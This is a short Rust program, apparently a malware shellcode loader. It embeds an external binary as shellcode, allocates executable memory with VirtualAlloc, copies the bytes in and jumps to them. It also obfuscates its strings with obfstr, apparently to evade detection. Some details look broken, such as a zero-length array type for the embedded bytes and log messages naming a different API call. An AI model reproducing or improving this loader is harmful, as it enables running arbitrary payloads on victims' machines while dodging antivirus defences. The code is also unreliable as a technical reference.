use winapi::ctypes::c_void;
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::memoryapi::WriteProcessMemory;

static shellcode: &[u8; 0] = include_bytes!("../init.init");
// ignore the print out, i rush made this in like 10m so ye
fn main() {
    unsafe {
        let buffer = VirtualAlloc(std::ptr::null_mut(), shellcode.len(), 0x00001000, 0x40);

        if buffer.is_null() {
            println!("{}", obfstr::obfstr!("VirtualAllocEx failed"));
        } else {
            println!("{}", obfstr::obfstr!("VirtualAllocEx success"));
        }

        let write = WriteProcessMemory(
            std::ptr::null_mut(),
            buffer,
            shellcode.as_ptr() as *const c_void,
            shellcode.len(),
            std::ptr::null_mut(),
        );

        if write == 0 {
            println!("{}", obfstr::obfstr!("WriteProcessMemory failed"));
        } else {
            println!("{}", obfstr::obfstr!("WriteProcessMemory success"));
        }

        std::ptr::copy(
            shellcode.as_ptr() as *const u8,
            buffer as *mut u8,
            shellcode.len(),
        );

        let exec = std::mem::transmute::<*mut c_void, fn()>(buffer);
        exec();
    }
}
